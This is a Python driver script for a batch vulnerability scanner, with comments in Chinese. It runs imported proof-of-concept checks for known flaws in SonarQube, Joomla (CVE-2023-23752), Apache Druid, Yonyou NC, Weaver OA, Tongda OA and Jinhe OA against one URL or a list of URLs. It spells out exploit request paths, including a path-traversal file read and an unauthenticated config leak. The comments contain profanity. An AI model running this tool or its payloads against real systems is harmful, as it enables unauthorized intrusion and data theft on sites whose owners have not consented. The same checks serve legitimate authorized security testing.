from POC import CVE_2020_27986, PocFun
from POC import CNVD_2021_30167
from POC import CVE_2021_36749
import argparse
from urllib.parse import urlparse

from POC.用友NC目录遍历漏洞 import yonyou_path
from POC.泛微OAV8SQL注入 import fanwei_OA_sql
from POC.龙璟科技_电池能量BEMS任意下载 import BEMS_download
from POC.齐治堡垒机任意用户登录 import qzbl_anylogin
from POC.金和OA_C6任意下载 import jdOA_anydownload
from POC.通达OA2017前台任意用户登录漏洞 import get2017Session, getV11Session
from main import hprint
import main

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

par = argparse.ArgumentParser(description='未知版本(内测版)')
par.add_argument('--url', '-u', help='需要扫描的url', default=False)
par.add_argument('--timeout', '-t', help='指定超时数值,默认为6', default=6, type=int)
par.add_argument('--thead', '-n', help='线程数,默认为1(暂不开发)', type=int, default=1)
par.add_argument('--file', '-f', help='批量url文本', default=False)
args = par.parse_args()

'''
检测这个傻逼是不是输入空的url
'''
if args.url is False and args.file is False:
    hprint(logo=True)
    par.print_help()
    exit()

url = args.url
timeout = args.timeout
thead = args.thead
file = args.file

# 检测到的漏洞数
check_num = 0


def check_POC(in_url, timeout=6):
    turl = in_url
    global check_num
    if not 'http' in in_url:
        turl = urlparse(in_url)
        if not turl.scheme:
            turl = turl._replace(scheme='http', path=turl.path.strip('/'))  # 填充http头部
            turl = turl.geturl().replace('///', '//')

    re = CVE_2020_27986.SonarQube_data_leak(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
                           url=turl,
                           addurl='/api/index.php/v1/config/application?public=true',
                           includelist='links'
                           )
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = CVE_2021_36749.Apache_Druid_any_path(inurl=turl, timeout=timeout)
    if '返回成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = CNVD_2021_30167.yonyou_nc(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = yonyou_path(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = fanwei_OA_sql(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = BEMS_download(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = qzbl_anylogin(url=turl, timeout=timeout)
    if '成功' == re:
        main.print_green()
        check_num = check_num + 1

    re = get2017Session(url=turl, timeout=timeout)
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = getV11Session(url=turl, timeout=timeout)
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = jdOA_anydownload(url=turl, timeout=timeout)
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = PocFun.pocfuntion(pocname='一米OA 任意文件读取漏洞',
                           url=turl,
                           addurl='/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'
                           )
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
                           url=turl,
                           addurl='/api/index.php/v1/config/application?public=true',
                           includelist='links'
                           )
    if '成功' in re:
        main.print_green(context=re)
        check_num = check_num + 1

    main.print_yellow(f'一共检测到{check_num}个漏洞')


def url_check(in_url):
    main.print_yellow('检测到单链接模式')
    check_POC(in_url)


def file_check(in_file):
    main.print_yellow('检测到批量模式')
    try:
        file = open(in_file, 'r')
        while True:
            out_url = file.readline()
            if out_url == '':
                break
            check_POC(out_url)
    except IOError as e:
        main.print_red('读取错误：' + e)
    except Exception as e:
        main.print_red('未知错误：' + str(e))


# 如果file不为空
if args.file:
    # 批量检测
    args.url = False
    file_check(file)
if args.url:
    # 单url检测
    if args.url and args.file:
        hprint('不能两个同时检测啊！操你妈')
        exit()
    else:
        url_check(url)
